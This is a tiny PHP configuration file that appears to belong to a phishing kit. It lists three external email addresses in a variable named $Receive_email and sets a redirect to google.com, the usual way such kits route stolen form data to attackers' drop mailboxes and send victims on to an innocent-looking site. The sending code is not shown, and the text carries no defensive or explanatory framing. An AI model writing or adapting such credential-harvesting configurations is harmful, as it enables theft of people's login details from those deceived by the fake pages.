<?php 
$Receive_email="dodomefaso@yandex.com,ezenwadije01@gmail.com,sparooo@mail.bg";
$redirect="https://www.google.com/";
?>